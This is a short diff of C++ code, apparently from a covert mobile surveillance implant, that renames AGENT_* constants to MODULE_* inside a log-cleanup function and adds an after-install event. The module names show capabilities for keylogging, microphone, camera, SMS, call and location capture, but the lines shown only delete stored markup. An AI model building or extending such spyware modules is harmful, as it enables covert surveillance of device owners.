@@ -461,22 +461,22 @@ BOOL Log::RemoveMarkup(UINT uAgentId){
 // Cancella tutti i markup
 // MANAGEMENT - Aggiungere qui tutti i nuovi agenti/eventi
 void Log::RemoveMarkups() {
-	RemoveMarkup(AGENT_SMS);
-	RemoveMarkup(AGENT_ORGANIZER);
-	RemoveMarkup(AGENT_CALLLIST);
-	RemoveMarkup(AGENT_DEVICE);
-	RemoveMarkup(AGENT_POSITION);
-	RemoveMarkup(AGENT_CALL);
-	RemoveMarkup(AGENT_CALL_LOCAL);
-	RemoveMarkup(AGENT_KEYLOG);
-	RemoveMarkup(AGENT_SNAPSHOT);
-	RemoveMarkup(AGENT_URL);
-	RemoveMarkup(AGENT_IM);
-	RemoveMarkup(AGENT_MIC);
-	RemoveMarkup(AGENT_CAM);
-	RemoveMarkup(AGENT_CLIPBOARD);
-	RemoveMarkup(AGENT_APPLICATION);
-	RemoveMarkup(AGENT_CRISIS);
+	RemoveMarkup(MODULE_SMS);
+	RemoveMarkup(MODULE_ORGANIZER);
+	RemoveMarkup(MODULE_CALLLIST);
+	RemoveMarkup(MODULE_DEVICE);
+	RemoveMarkup(MODULE_POSITION);
+	RemoveMarkup(MODULE_CALL);
+	RemoveMarkup(MODULE_CALL_LOCAL);
+	RemoveMarkup(MODULE_KEYLOG);
+	RemoveMarkup(MODULE_SNAPSHOT);
+	RemoveMarkup(MODULE_URL);
+	RemoveMarkup(MODULE_IM);
+	RemoveMarkup(MODULE_MIC);
+	RemoveMarkup(MODULE_CAM);
+	RemoveMarkup(MODULE_CLIPBOARD);
+	RemoveMarkup(MODULE_APPLICATION);
+	RemoveMarkup(MODULE_CRISIS);
 
 	RemoveMarkup(EVENT_TIMER);
 	RemoveMarkup(EVENT_SMS);
@@ -490,6 +490,7 @@ void Log::RemoveMarkups() {
 	RemoveMarkup(EVENT_CELLID);
 	RemoveMarkup(EVENT_LOCATION);
 	RemoveMarkup(EVENT_STANDBY);
+	RemoveMarkup(EVENT_AFTERINST);
 
 	return;
 }
